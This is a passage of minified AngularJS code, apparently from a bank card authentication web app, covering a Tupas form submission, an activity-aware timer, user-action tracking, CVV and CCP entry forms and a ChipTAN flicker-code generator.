enableTupasForm(){ValButton.setDisable(!1),$scope.tupasAction=$sce.trustAsResourceUrl(tupasAction),tupasData=JSON.parse(tupasData),$scope.tupasForm.actionId=tupasData.A01Y_ACTION_ID,$scope.tupasForm.vers=tupasData.A01Y_VERS,$scope.tupasForm.rcvid=tupasData.A01Y_RCVID,$scope.tupasForm.langCode=tupasData.A01Y_LANGCODE,$scope.tupasForm.stamp=tupasData.A01Y_STAMP,$scope.tupasForm.idType=tupasData.A01Y_IDTYPE,$scope.tupasForm.retLink=$sce.trustAsResourceUrl(tupasData.A01Y_RETLINK),$scope.tupasForm.canLink=$sce.trustAsResourceUrl(tupasData.A01Y_CANLINK),$scope.tupasForm.rejLink=$sce.trustAsResourceUrl(tupasData.A01Y_REJLINK),$scope.tupasForm.keyVer=tupasData.A01Y_KEYVERS,$scope.tupasForm.alg=tupasData.A01Y_ALG,$scope.tupasForm.mac=tupasData.A01Y_MAC,SplashScreen.hide()}var tupasData=ThisService.data[$rootScope.uniqueId].authRequestData,tupasAction=ThisService.data[$rootScope.uniqueId].chosenDeviceValue;ValButton.setDisable(!0),_.isEmpty(tupasData)?Tupas.load().then(function(){tupasData=ThisService.data[$rootScope.uniqueId].authRequestData,tupasAction=ThisService.data[$rootScope.uniqueId].chosenDeviceValue,enableTupasForm()}):enableTupasForm(),ValButton.setAction(function(){MessageBanner.display($scope.network,$scope.means,ThisService.data[$rootScope.uniqueId].pageType,MessageBanner.AUTHENTICATION_IN_PROGRESS),ThisService.data[$rootScope.uniqueId].callbackLang=$translate.proposedLanguage()||$translate.use(),$unloadEvent.disable(),document.getElementById("formTupas").submit()})}]),(ACS3=angular.module("ACS3")).factory("IntervalByBrowserActivity",["$timeout","$window",function($timeout,$window){var hidden,focus=!0,errorListnener=!1;function IntervalByBrowserActivity(callback,delay,options){var self=this;if(self.DEBUG=!1,self.ID=_.uniqueId("id_"),void 0!==options&&"object"==typeof options&&void 0!==options.debugmode&&options.debugmode&&(self.DEBUG=!0),self.debugModeLogger=function(message){self.DEBUG&&console.log(self.ID+": "+message)},self.debugModeLogger("Debug mode start"),void 0!==callback&&"function"==typeof callback)if(void 0===delay||isNaN(delay))console.error("Error IntervalByBrowserActivity: the second parameter must be a number (delay)");else{void 0!==options&&"object"==typeof options?(void 0===options.customInterval&&(customInterval=!1),void 0===options.waitVisibilityLost&&(waitVisibilityLost=!1),void 0===options.waitFocusLost&&(waitFocusLost=!1),void 0===options.keepCallbackCallInterval&&(keepCallbackCallInterval=!1),void 0===options.sleepDelay&&(sleepDelay=0),0==options.keepCallbackCallInterval&&0<options.sleepDelay&&console.warn("Warn IntervalByBrowserActivity: the 'sleepDelay' option cannot operate without the 'keepCallbackCallInterval' option")):(customInterval=!1,waitVisibilityLost=!1,waitFocusLost=!1,keepCallbackCallInterval=!1,sleepDelay=0),self.debugModeLogger("check parameters done"),self.instance=null,self.stopInterval=!1,self.lCallback=callback,self.lDelay=parseInt(delay),self.customInterval=options.customInterval,self.waitVisibilityLost=options.waitVisibilityLost,self.waitFocusLost=options.waitFocusLost,self.sleepDelay=options.sleepDelay,self.keepCallbackCallInterval=options.keepCallbackCallInterval,self.isSleep=!1,self.debugTime=Math.round(Date.now()/1e3),self.waitVisibilityLost&&(null==hidden?(self.waitVisibilityLost=!1,self.debugModeLogger("'waitVisibilityLost' option set to false because it is not supported")):self.debugModeLogger("'waitVisibilityLost' option is supported")),self.waitFocusLost&&(errorListnener?(self.waitFocusLost=!1,self.debugModeLogger("'waitFocusLost' option set to false because it is not supported")):self.debugModeLogger("'waitFocusLost' option is supported")),self.calcDelay=function(){return this.isSleep&&this.keepCallbackCallInterval&&0<this.sleepDelay?this.sleepDelay:this.lDelay},self.check=function(callback){self.stopInterval?self.debugModeLogger("interrupting the timer was not fast enough, but the interval was stopped"):(self.waitVisibilityLost&&self.waitFocusLost?0==document[hidden]&&focus?(self.debugModeLogger("callback called, time between the previous interval "+(Math.round(Date.now()/1e3)-self.debugTime)+"s"),self.isSleep=!1,callback({id:self.ID,sleepMode:self.isSleep})):self.keepCallbackCallInterval?(self.debugModeLogger("pause activity, but keep call callback (cause: hidden => "+document[hidden]+" | focus lost => "+!focus+"), time between the previous interval "+(Math.round(Date.now()/1e3)-self.debugTime)+"s"),self.isSleep=!0,callback({id:self.ID,sleepMode:self.isSleep})):self.debugModeLogger("pause activity (cause: hidden => "+document[hidden]+" | focus lost => "+!focus+"), time between the previous interval "+(Math.round(Date.now()/1e3)-self.debugTime)+"s"):self.waitVisibilityLost?0==document[hidden]?(self.debugModeLogger("callback called, time between the previous interval "+(Math.round(Date.now()/1e3)-self.debugTime)+"s"),self.isSleep=!1,callback({id:self.ID,sleepMode:self.isSleep})):self.keepCallbackCallInterval?(self.debugModeLogger("pause activity, but keep call callback (cause: hidden => "+document[hidden]+"), time between the previous interval "+(Math.round(Date.now()/1e3)-self.debugTime)+"s"),self.isSleep=!0,callback({id:self.ID,sleepMode:self.isSleep})):self.debugModeLogger("pause activity (cause: hidden => "+document[hidden]+"), time between the previous interval "+(Math.round(Date.now()/1e3)-self.debugTime)+"s"):!self.waitFocusLost||focus?(self.debugModeLogger("callback called, time between the previous interval "+(Math.round(Date.now()/1e3)-self.debugTime)+"s"),self.isSleep=!1,callback({id:self.ID,sleepMode:self.isSleep})):self.keepCallbackCallInterval?(self.debugModeLogger("pause activity, but keep call callback (cause: focus lost => "+!focus+"), time between the previous interval "+(Math.round(Date.now()/1e3)-self.debugTime)+"s"),self.isSleep=!0,callback({id:self.ID,sleepMode:self.isSleep})):self.debugModeLogger("pause activity (cause: focus lost => "+!focus+"), time between the previous interval "+(Math.round(Date.now()/1e3)-self.debugTime)+"s"),self.debugTime=Math.round(Date.now()/1e3))},self.runner=function(callback){if(self.check(callback),0==self.customInterval){self.debugModeLogger("'customInterval' is not activated, runner called");var finalDelay=self.calcDelay();self.instance=$timeout(function(){self.runner(callback)},finalDelay)}else self.debugModeLogger("'customInterval' is activate, wait for the call to the 'next()' function")};var finalDelay=self.calcDelay();self.instance=$timeout(function(){self.runner(callback)},finalDelay)}else console.error("Error IntervalByBrowserActivity: the first parameter must be a function (callback)")}return void 0!==document.hidden?(hidden="hidden",0):void 0!==document.msHidden?(hidden="msHidden",0):void 0!==document.webkitHidden?(hidden="webkitHidden",0):console.error("Error IntervalByBrowserActivity: this browser not support document.hidden, therefore the service 'IntervalByBrowserActivity' will ignore the option 'waitVisibilityLost'"),void 0===$window.addEventListener?(errorListnener=!0,console.error("Error IntervalByBrowserActivity: the addEventListener is not supported, therefore the service 'IntervalByBrowserActivity' will ignore the option 'waitFocusLost'")):($window.addEventListener("focus",function(evt){focus=!0},!1),$window.addEventListener("blur",function(evt){focus=!1},!1)),IntervalByBrowserActivity.prototype.cancel=function(){this.debugModeLogger("Cancellation has been requested"),this.stopInterval?this.debugModeLogger("Cancellation was ignored because already stopped"):(null!=this.instance&&$timeout.cancel(this.instance),this.stopInterval=!0,this.instance=null,this.debugModeLogger("the interval was cancelled (maybe, if you don't have a new cancel message, you can consider that the interval is canceled)"))},IntervalByBrowserActivity.prototype.restart=function(delay){var self=this;if(self.debugModeLogger("Restart has been requested"),void 0!==delay){if(isNaN(delay))return void console.error("Error IntervalByBrowserActivity.restart: the parameter delay must be an integer (in ms)");self.debugModeLogger("Update the initial delay, "+self.lDelay+"ms become "+delay+"ms"),self.lDelay=parseInt(delay)}0!=self.stopInterval&&null==self.instance||self.cancel(),self.debugModeLogger("wait 1s before starting interval"),$timeout(function(){self.stopInterval=!1;var finalDelay=self.calcDelay();self.debugModeLogger("restart complete"),self.instance=$timeout(function(){self.runner(self.lCallback)},finalDelay)},1e3)},IntervalByBrowserActivity.prototype.next=function(){var self=this;if(self.debugModeLogger("'next()' was called"),self.stopInterval)self.debugModeLogger("'next()' was ignored because the interval was stopped");else if(0!=self.customInterval){var finalDelay=self.calcDelay();self.instance=$timeout(function(){self.runner(self.lCallback)},finalDelay)}else console.error("You cannot use this method without activating the 'customInterval' option")},{get:function(callback,delay,options){return new IntervalByBrowserActivity(callback,delay,options)}}}]);ACS3=angular.module("ACS3");var PageTypes=Object.freeze({ALL:"ALL",CHOICE_PAGE:"CHOICE_PAGE",MEANS_PAGE:"MEANS_PAGE",OTP_FORM_PAGE:"OTP_FORM_PAGE",REFUSAL_PAGE:"REFUSAL_PAGE",CANCEL_PAGE:"CANCEL_PAGE",HELP_PAGE:"HELP_PAGE",FAILURE_PAGE:"FAILURE_PAGE",MESSAGE_BODY:"MESSAGE_BODY",MESSAGE_OBJECT:"MESSAGE_OBJECT",POLLING_PAGE:"POLLING_PAGE",INFO_PAGE:"INFO_PAGE",CUSTOM_PAGE:"CUSTOM_PAGE",CALLBACK_PAGE:"CALLBACK_PAGE"}),UserActionType=Object.freeze({HELP_CLICK:"HELP_CLICK",LANGUAGE_SELECTION:"LANGUAGE_SELECTION",USER_CHOICE:"USER_CHOICE",BACK_TO_MERCHANT:"BACK_TO_MERCHANT",CANCEL_CLICK:"CANCEL_CLICK",DEVICE_CHOICE:"DEVICE_CHOICE",VALIDATE:"VALIDATE",RE_SEND_OTP:"RE_SEND_OTP",WINDOW_UNLOAD:"WINDOW_UNLOAD",PAGE_RERFRESH:"PAGE_RERFRESH",RETURN_TO_PA:"RETURN_TO_PA",TECHNICAL_ERROR:"TECHNICAL_ERROR",SESSION_TIME_OUT:"SESSION_TIME_OUT",HUB_CHOICE:"HUB_CHOICE",POLLING_ACTION:"POLLING_ACTION",REFRESH_PHONE_NUMBER_CLICK:"REFRESH_PHONE_NUMBER_CLICK"}),ReactionLevel=Object.freeze({SUCCESS:"SUCCESS",INFO:"INFO",WARNING:"WARNING",ERROR:"ERROR",NONE:"NONE"}),MeansTriggeringEvent=Object.freeze({NORMAL:"NORMAL",FALLBACK:"FALLBACK",BACKUP:"BACKUP",CHOICE:"CHOICE",COMBINED:"COMBINED"});ACS3.factory("UserExperienceService",["ThisService","$rootScope","HelpService","$state","I18N","SwitchMeansButton","DeviceSelect","AuthentPagesService","$injector","MeansSelectMenu",function(ThisService,$rootScope,HelpService,$state,I18N,SwitchMeansButton,DeviceSelect,AuthentPagesService,$injector,MeansSelectMenu){function getOrdinalActions(){return++ThisService.data[$rootScope.uniqueId].userExperience.ordinals.actions}function getCurrentUserAuthent(){var userAuthentications=_.get(ThisService.data[$rootScope.uniqueId],"userExperience.userAuthentications",void 0);return userAuthentications?userAuthentications[userAuthentications.length-1]:void 0}function endLastUserAuthent(){var userAuthentications=_.get(ThisService.data[$rootScope.uniqueId],"userExperience.userAuthentications",void 0);if(userAuthentications){var lastUserAuthent=userAuthentications.pop();lastUserAuthent&&(lastUserAuthent.endTime=moment(),userAuthentications.push(lastUserAuthent),0<ThisService.data[$rootScope.uniqueId].userExperience.ordinals.actions&&(ThisService.data[$rootScope.uniqueId].userExperience.ordinals.actions=0))}}var service={start:function(){HelpService.onDisplayToogle($rootScope,function(){HelpService.showing&&service.track(UserActionType.HELP_CLICK,ReactionLevel.SUCCESS)}),I18N.subscribeClicked($rootScope,function(){service.track(UserActionType.LANGUAGE_SELECTION,ReactionLevel.SUCCESS)}),SwitchMeansButton.subscribeClicked($rootScope,function(){service.track(UserActionType.USER_CHOICE)}),MeansSelectMenu.subscribeItemSelected($rootScope,function(){service.track(UserActionType.USER_CHOICE)}),DeviceSelect.subscribeClicked($rootScope,function(){service.track(UserActionType.DEVICE_CHOICE,ReactionLevel.SUCCESS)}),$rootScope.$on("onBeforeUnload",function(e){var storageKey=$rootScope.uniqueId,thisServiceData=$injector.get("$sessionStorage")[storageKey],userAction={ordinal:getOrdinalActions(),dateTime:moment(),page:_.get(thisServiceData,"pageType",PageTypes.ALL),action:UserActionType.WINDOW_UNLOAD,actionData:"",reactionLevel:ReactionLevel.NONE},userAuthentications=thisServiceData.userExperience.userAuthentications,currentUserAuthent=userAuthentications[userAuthentications.length-1];currentUserAuthent&&(currentUserAuthent.actions.push(userAction),++thisServiceData.userExperience.ordinals.actions,$injector.get("$sessionStorage")[storageKey]=thisServiceData)})},addUserAuthent:function(meanTriggeringEvent){ThisService.data[$rootScope.uniqueId]&&_.isEmpty(ThisService.data[$rootScope.uniqueId].userExperience)&&(ThisService.data[$rootScope.uniqueId].userExperience={ordinals:{auth:0,actions:0},accountId:ThisService.data[$rootScope.uniqueId].accountId,userAuthentications:[]}),endLastUserAuthent();var userAuthent={ordinal:++ThisService.data[$rootScope.uniqueId].userExperience.ordinals.auth,startTime:moment(),endTime:void 0,profileMeans:ThisService.data[$rootScope.uniqueId].currentMeans,profileName:ThisService.data[$rootScope.uniqueId].currentProfileName,meansTriggeringEvent:meanTriggeringEvent,actions:[]};ThisService.data[$rootScope.uniqueId].userExperience.userAuthentications.push(userAuthent)},track:function(actionType,reactionLevel){var userAction={ordinal:getOrdinalActions(),dateTime:moment(),page:ThisService.data[$rootScope.uniqueId].pageType?ThisService.data[$rootScope.uniqueId].pageType:PageTypes.ALL,action:actionType,actionData:"",reactionLevel:reactionLevel||ReactionLevel.NONE},userAuthent=getCurrentUserAuthent();userAuthent&&userAuthent.actions.push(userAction)},addReactionLevel:function(reactionLevel){var userAuthent=getCurrentUserAuthent();if(userAuthent){var lastUserAction=userAuthent.actions.pop();lastUserAction&&(lastUserAction.reactionLevel=reactionLevel,userAuthent.actions.push(lastUserAction))}},end:function(){endLastUserAuthent();var data=angular.copy(ThisService.data[$rootScope.uniqueId].userExperience);delete data.ordinals,AuthentPagesService.sendUserExperience(data)}};return service}]);ACS_COMMONS=angular.module("ACS_COMMONS",["ngCookies","ngStorage","pascalprecht.translate"]);(ACS_COMMONS=angular.module("ACS_COMMONS")).directive("alternativeDisplay",function(){return{restrict:"E",scope:{sessionAttribute:"=attribute",sessionAttributeValue:"=value",enabled:"=?",disabled:"=?",defaultFallback:"=?"},templateUrl:"common/directives/AlternativeDisplay/alternativeDisplay.html",controller:"AlternativeDisplayCtrl"}}),ACS_COMMONS.controller("AlternativeDisplayCtrl",["$scope","$rootScope","$sessionStorage",function($scope,$rootScope,$sessionStorage){$scope.showAltDisplay=!1,$scope.enabledClasses=_.isString($scope.enabled)?_.words($scope.enabled,/\S+/g):[],$scope.disabledClasses=_.isString($scope.disabled)?_.words($scope.disabled,/\S+/g):[],$scope.defaultClasses=_.isString($scope.defaultFallback)?_.words($scope.defaultFallback,/\S+/g):[];function removeElementsByClass(className){for(var elements=document.getElementsByClassName(className);0<elements.length;)elements[0].parentNode.removeChild(elements[0])}var show,defaultElements,disabledElements,enabledElements,html;if(!_.isNil($rootScope.uniqueId)&&!_.isNil($sessionStorage[$rootScope.uniqueId])){var attributeExists=_.hasIn($sessionStorage[$rootScope.uniqueId],$scope.sessionAttribute),attributeValue=_.get($sessionStorage[$rootScope.uniqueId],$scope.sessionAttribute),attributeMatchesValue=_.isEqual(attributeValue,$scope.sessionAttributeValue);attributeExists&&attributeMatchesValue?($scope.htmlValue=(html="",_.forEach($scope.enabledClasses,function(cssClass){enabledElements=document.getElementsByClassName(cssClass),_.forEach(enabledElements,function(el){html+=el.innerHTML})}),html),_.forEach($scope.disabledClasses,function(cssClass){removeElementsByClass(cssClass)}),_.forEach($scope.enabledClasses,function(cssClass){removeElementsByClass(cssClass)}),_.forEach($scope.defaultClasses,function(cssClass){removeElementsByClass(cssClass)}),$scope.layoutData={elements:[{type:"div",value:$scope.htmlValue}]},$scope.showAltDisplay=!0):(_.forEach($scope.disabledClasses,function(cssClass){disabledElements=document.getElementsByClassName(cssClass),_.forEach(disabledElements,function(el){el.style.display="none"})}),show=!0,_.forEach($scope.defaultClasses,function(cssClass){defaultElements=document.getElementsByClassName(cssClass),_.forEach(defaultElements,function(el){el.style.display=show?"block":"none"})}))}}]),(ACS_COMMONS=angular.module("ACS_COMMONS")).directive("autoSubmit",["$timeout",function($timeout){return{require:"form",restrict:"A",link:function($scope,$el,$attr,$form){$timeout(function(){$el[0].submit()})}}}]),(ACS_COMMONS=angular.module("ACS_COMMONS")).directive("ccpForm",function(){return{restrict:"E",scope:{},templateUrl:"common/directives/CCPForm/CCPForm.html",controller:"ccpFormCtrl"}}),ACS_COMMONS.controller("ccpFormCtrl",["$scope","$rootScope","OtpRecorder","ValButton","cvvRecorder",function($scope,$rootScope,OtpRecorder,ValButton,cvvRecorder){$scope.input={ccp:"",disabled:OtpRecorder.disabled},ValButton.setDisable(!0),$scope.otpInputDisabled=!1,OtpRecorder.onDisabledOtpInput($scope,function(){$scope.input.disabled=OtpRecorder.disabled}),OtpRecorder.onClearOtpInput($scope,function(){$scope.input.ccp="",cvvRecorder.isCCPPresent=!1}),ValButton.setDisable(!0),$scope.registerCCPInCvvRecorder=function(){cvvRecorder.isCCPPresent=!0},$scope.onlyNumber=function(e){var theEvent=e||window.event,key=theEvent.key;!/[0-9]/.test(key)&&1==key.length&&(1!=theEvent.metaKey&&1!=theEvent.ctrlKey||"v"!=key&&"c"!=key)&&(theEvent.returnValue=!1,theEvent.preventDefault&&theEvent.preventDefault())},window.OTPOnlyNumber=$scope.onlyNumber,$scope.isCCPValid=function(){""!=$scope.input.ccp&&null!=$scope.input.ccp&&4==$scope.input.ccp.length?cvvRecorder.isCCPValid=!0:cvvRecorder.isCCPValid=!1},$scope.saveCCP=function(){OtpRecorder.enterOtp($scope.input.ccp),$scope.isCCPValid(),cvvRecorder.isCVVPresent?ValButton.setDisable(!(cvvRecorder.isCCPValid&&cvvRecorder.isCVVValid)):ValButton.setDisable(!cvvRecorder.isCCPValid)}}]),(ACS_COMMONS=angular.module("ACS_COMMONS")).directive("cvvForm",function(){return{restrict:"E",scope:{},templateUrl:"common/directives/CVVForm/CVVForm.html",controller:"cvvFormCtrl"}}),ACS_COMMONS.factory("cvvRecorder",["$rootScope",function($rootScope){var cvvRecorder={enteredCvv:"",isCVVPresent:!1,isDDNPresent:!1,isCCPPresent:!1,isCVVValid:!1,isDDNValid:!1,isCCPValid:!1,enterCvv:function(cvv){cvvRecorder.enteredCvv=cvv,$rootScope.$emit("validCVV")},onClearCvvInput:function(scope,callback){var handler=$rootScope.$on("clear_cvv_input_event",callback);scope.$on("$destroy",handler)},clearCvv:function(){this.enteredCvv="",$rootScope.$emit("clear_cvv_input_event")},subscribe:function(scope,callback){var handler=$rootScope.$on("validCVV",callback);scope.$on("$destroy",handler)}};return cvvRecorder}]),ACS_COMMONS.controller("cvvFormCtrl",["$scope","$rootScope","OtpRecorder","cvvRecorder","ValButton",function($scope,$rootScope,OtpRecorder,cvvRecorder,ValButton){$scope.input={cvv:"",disabled:OtpRecorder.disabled},ValButton.setDisable(!0),OtpRecorder.onDisabledOtpInput($scope,function(){$scope.input.disabled=OtpRecorder.disabled}),cvvRecorder.onClearCvvInput($scope,function(){$scope.input.cvv=cvvRecorder.enteredCvv}),$scope.registerCVVInCvvRecorder=function(){cvvRecorder.isCVVPresent=!0},$scope.isCVVValid=function(){""!=$scope.input.cvv&&null!=$scope.input.cvv&&3==$scope.input.cvv.length?cvvRecorder.isCVVValid=!0:cvvRecorder.isCVVValid=!1},$scope.onlyNumber=function(e){var theEvent=e||window.event,key=theEvent.key;!/[0-9]/.test(key)&&1==key.length&&(1!=theEvent.metaKey&&1!=theEvent.ctrlKey||"v"!=key&&"c"!=key)&&(theEvent.returnValue=!1,theEvent.preventDefault&&theEvent.preventDefault())},$scope.saveCvv=function(){$scope.isCVVValid(),cvvRecorder.isCVVValid&&cvvRecorder.enterCvv($scope.input.cvv),cvvRecorder.isCCPPresent?ValButton.setDisable(!(cvvRecorder.isCCPValid&&cvvRecorder.isCVVValid)):cvvRecorder.isDDNPresent?ValButton.setDisable(!(cvvRecorder.isDDNValid&&cvvRecorder.isCVVValid)):ValButton.setDisable(!cvvRecorder.isCVVValid)}}]),(ACS_COMMONS=angular.module("ACS_COMMONS")).directive("chiptan",function(){return{restrict:"E",templateUrl:"common/directives/Chiptan/chiptan.html",scope:{speedLabel:"=?",zoomLabel:"=?",manualLinkLabel:"=?",manualText:"=?",manualDescription:"=?"},link:function($scope,element,attrs){var canvasElemTemp=element.find("canvas");$scope.canvas=canvasElemTemp[0];var context=$scope.canvas.getContext("2d"),dereg=$scope.$on("UPDATE_CHIP_TAN_EVENT",function(event){!function(width,height,traingleheight,spacebar,barmargin){$scope.canvas.width=width,$scope.canvas.height=height,$scope.canvas.id="idcanvas",context.fillStyle="rgb(0,0,0)",context.fillRect(0,0,width,height);var barwidth=$scope.canvas.width/5,bt=traingleheight,x=(barwidth-bt)/2,y=spacebar+barmargin-bt/2;context.beginPath(),context.moveTo(x,y),context.lineTo(x+bt,y),context.lineTo(x+bt/2,y+bt/2),context.fillStyle="rgb(255 ,255 ,255 )",context.fill(),context.closePath(),context.stroke();var dist=width-barwidth;context.moveTo(x+dist,y),context.lineTo(x+bt+dist,y),context.lineTo(x+bt/2+dist,y+bt/2),context.fillStyle="rgb(255 ,255 ,255 )",context.fill(),context.closePath(),context.stroke()}($scope.flickerConfig.initialcanvaswidth,$scope.flickerConfig.initialcanvasheight,$scope.flickerConfig.triangleHeight,$scope.flickerConfig.spacebar,$scope.flickerConfig.barmargin),function(){var height=$scope.canvas.height,width=$scope.canvas.width,config=$scope.flickerConfig,barmargin=config.barmargin,spacebar=config.spacebar,input=$scope.currentHalfByte,barwidth=width/5;input[0]=$scope.clock;for(var i=0;i<5;i++)1===input[i]?context.fillStyle="rgb(255,255,255)":context.fillStyle="rgb(0,0,0)",context.fillRect(i*barwidth+barmargin,barmargin+spacebar,barwidth-2*barmargin,height-2*barmargin-20)}($scope.currentHalfByte)});$scope.$on("$destroy",dereg)},controller:"chiptanCtrl"}}),ACS_COMMONS.factory("ChiptanService",["$rootScope",function($rootScope){return{rawChallenge:null,parsedChiptanChallenge:{},opticalPayload:null,manualPayload:null,trunc:function(v){return v<0?Math.ceil(v):Math.floor(v)},setChallenge:function(chipTanChallenge){this.rawChallenge=chipTanChallenge},parseChallenge:function(rawChallenge){var result={};if(rawChallenge){var challenges=rawChallenge.split("$");2===challenges.length&&(result.manual=this.parseManualFields(challenges[0]),result.optical=this.parseOpticalFields(challenges[1])),this.opticalPayload=this.createOpticalPayload(result.optical),this.manualPayload=result.manual}return result},getManualPayload:function(){return this.manualPayload},getOpticalPayload:function(){return this.opticalPayload||this.parseChallenge(this.rawChallenge),this.opticalPayload},createOpticalPayload:function(input){var payload="",startElement=input.startelement,merchantName=input.merchantname,amount=input.amount,bankData=input.bankdata,luhnElements=[];startElement=startElement.trim(),startElement=this.convertCharSet(startElement),merchantName=merchantName.trim(),merchantName=this.convertCharSet(merchantName),amount=amount.trim(),amount=this.convertCharSet(amount),bankData=bankData.trim(),bankData=this.convertCharSet(bankData);var startElementLengthField=this.createStartCodeLengthField(startElement),controlField=this.createControlField();luhnElements.push(controlField),luhnElements.push(startElement),payload+=startElementLengthField,payload+=controlField,payload+=startElement,payload+=this.createDataLengthField(merchantName);var convertedMerchantName=this.toHex(merchantName,2);payload+=convertedMerchantName,luhnElements.push(convertedMerchantName),payload+=this.createDataLengthField(amount);var convertedAmount=this.toHex(amount,2);payload+=convertedAmount,luhnElements.push(convertedAmount),payload+=this.createDataLengthField(bankData);var convertedBankData=this.toHex(bankData,2);payload+=convertedBankData,luhnElements.push(convertedBankData);var payloadLength=payload.length/2+1;payload=this.toHex(payloadLength,2).concat(payload);var luhnChecksum=this.luhnChecksum(luhnElements),xorCheckSum=this.xorChecksum(payload);return payload+=this.toHex(luhnChecksum,1)+this.toHex(xorCheckSum,1)},parseOpticalFields:function(singleChallenge){if("267"===singleChallenge.substring(0,3)){for(var currentStartIndex=3,currentEndIndex=currentStartIndex+2,allowedElements={15:"bankdata",16:"amount",26:"merchantname"},fieldDescList=[],resultMap={};currentEndIndex<=9;){var currentElement=singleChallenge.substring(currentStartIndex,currentEndIndex);fieldDescList.push(allowedElements[currentElement]),currentStartIndex=currentEndIndex,currentEndIndex+=2}currentEndIndex=currentStartIndex+3;singleChallenge.substring(currentStartIndex,currentEndIndex);resultMap.startelement=singleChallenge.substring(0,currentEndIndex),currentStartIndex=currentEndIndex;for(var fieldDescIndex=0;currentStartIndex<singleChallenge.length;){currentEndIndex=currentStartIndex+2;var lengthField=singleChallenge.substring(currentStartIndex,currentEndIndex);currentStartIndex=currentEndIndex,currentEndIndex+=parseInt(lengthField);var fieldValue=singleChallenge.substring(currentStartIndex,currentEndIndex);resultMap[fieldDescList[fieldDescIndex++]]=fieldValue,currentStartIndex=currentEndIndex}}return resultMap},parseManualFields:function(singleChallenge){var result=null;if(singleChallenge&&_.startsWith(singleChallenge,"267160")){singleChallenge.substring(0,7);var payload=singleChallenge.substring(7,singleChallenge.length);result=payload=_.trim(payload)}return result},toHex:function(input,length){return"string"==typeof input?this.stringToHex(input,length):"number"==typeof input?this.numToHex(input,length):void 0},stringToHex:function(input,length){for(var result="",i=0;i<input.length;i++){var charCode=input.charCodeAt(i);result+=this.numToHex(charCode,length)}return result},numToHex:function(input,length){for(var hexNum=input.toString(16).toUpperCase();hexNum.length<length;)hexNum="0"+hexNum;return hexNum},convertCharSet:function(input){for(var output="",i=0;i<input.length;i++){switch(input.charCodeAt(i)){case 35:case 35:output+=String.fromCharCode(35);break;case 8364:case 128:output+=String.fromCharCode(36);break;case 163:case 163:output+=String.fromCharCode(94);break;case 64:case 64:output+=String.fromCharCode(64);break;case 228:case 228:output+=String.fromCharCode(123);break;case 246:case 246:output+=String.fromCharCode(124);break;case 252:case 252:output+=String.fromCharCode(125);break;case 196:case 196:output+=String.fromCharCode(91);break;case 214:case 214:output+=String.fromCharCode(92);break;case 220:case 220:output+=String.fromCharCode(93);break;case 223:case 223:output+=String.fromCharCode(126);break;default:126<input.charAt(i)?output+="?":output+=input.charAt(i)}}return output},createStartCodeLengthField:function(startElementData){var result=128|63&startElementData.length/2;return this.toHex(result,2)},createControlField:function(){return this.toHex(1,2)},createDataLengthField:function(elementData){var length=elementData.length;return this.toHex(64|63&length,2)},digitSum:function(value){for(var result=0;0!==value;)result+=value%10,value=Math.floor(value/10);return result},luhnChecksum:function(allInputElements){if(!allInputElements.every(function(elem,index,array){return elem.length%2==0}))return-1;for(var luhnSum=0,j=0;j<allInputElements.length;j++)for(var input=allInputElements[j],i=0;i<input.length;i++){var currentValue=parseInt(input[i],16);if(i%2!=0){var temp=2*currentValue;9<temp&&(temp=this.digitSum(temp)),luhnSum+=temp}else luhnSum+=currentValue}return 10*(this.trunc(luhnSum/10)+1)-luhnSum},xorChecksum:function(input){for(var checkSum=0,i=0;i<input.length;i++){checkSum^=parseInt(input[i],16)}return checkSum}}}]),ACS_COMMONS.controller("chiptanCtrl",["$scope","$rootScope","ChiptanService","$document","$interval",function($scope,$rootScope,ChiptanService,$document,$interval){var stopPromise,bitarray;$scope.payload=ChiptanService.getOpticalPayload(),$scope.manualPayload=ChiptanService.getManualPayload(),$scope.flickerConfig={initialcanvaswidth:225,initialcanvasheight:100,spacebar:20,barmargin:7,zoomvalue:5,barfrequencyvalue:50,triangleHeight:30},$scope.showOpticalChallenge=!0,$scope.clock=1,$scope.preparePayloadForDisplay=function(){var bits={0:[0,0,0,0,0],1:[0,1,0,0,0],2:[0,0,1,0,0],3:[0,1,1,0,0],4:[0,0,0,1,0],5:[0,1,0,1,0],6:[0,0,1,1,0],7:[0,1,1,1,0],8:[0,0,0,0,1],9:[0,1,0,0,1],A:[0,0,1,0,1],B:[0,1,1,0,1],C:[0,0,0,1,1],D:[0,1,0,1,1],E:[0,0,1,1,1],F:[0,1,1,1,1]};for((bitarray=[])[0]=bits[0],bitarray[1]=bits.F,bitarray[2]=bits.F,i=0;i<this.payload.length;i+=2)bitarray[i+3]=bits[this.payload[i+1]],bitarray[i+4]=bits[this.payload[i]]},$scope.reset=function(){$scope.displayCounter=0,angular.isDefined(stopPromise)||(stopPromise=$interval($scope.step,$scope.flickerConfig.barfrequencyvalue)),$scope.clock=1},$scope.step=function(){$scope.currentHalfByte=bitarray[$scope.displayCounter],$scope.$emit("UPDATE_CHIP_TAN_EVENT"),$scope.clock--,$scope.clock<0&&($scope.clock=1,$scope.displayCounter++,$scope.displayCounter>=bitarray.length&&($scope.displayCounter=0))},$scope.zoomIn=function(){$scope.flickerConfig.initialcanvaswidth=$scope.flickerConfig.initialcanvaswidth+$scope.flickerConfig.zoomvalue,this.reset()},$scope.zoomOut=function(){$scope.flickerConfig.initialcanvaswidth=$scope.flickerConfig.initialcanvaswidth-$scope.flickerConfig.zoomvalue,this.reset()},$scope.speedUp=function(){$scope.stopFlicker();var frametime=$scope.flickerConfig.barfrequencyvalue-10;frametime<10&&(frametime=10),$scope.flickerConfig.barfrequencyvalue=frametime,$scope.startFlicker()},$scope.slowDown=function(){$scope.stopFlicker();var frametime=$scope.flickerConfig.barfrequencyvalue+10;500<frametime&&(frametime=500),$scope.flickerConfig.barfrequencyvalue=frametime,$scope.startFlicker()},$scope.startFlicker=function(){$scope.reset()},$scope.stopFlicker=function(){$interval.cancel(stopPromise)||console.log("Flicker could not be stopped"),stopPromise=void 0},$scope.removeElement=function(element){element&&element.parentNode&&element.parentNode.removeChild(element)},$scope.opticalChallengeIsEnabled=function(){return $scope.showOpticalChallenge},$scope.switchChallengeModes=function(){$scope.showOpticalChallenge=!$scope.showOpticalChallenge,$scope.showOpticalChallenge?$scope.startFlicker():$scope.stopFlicker()},$scope.$on("$destroy",function(){$scope.stopFlicker()}),$scope.preparePayloadForDisplay(),$scope.reset()}]),function(){"use strict";angular.module("ACS_COMMONS").directive("clickOutside",["$document","$parse","$timeout",function($document,$parse,$timeout){return{restrict:"A",link:function($scope,elem,attr){$timeout(function(){var classList=void 0!==attr.outsideIfNot?attr.outsideIfNot.split(/[ ,]+/):[];function eventHandler(e){var 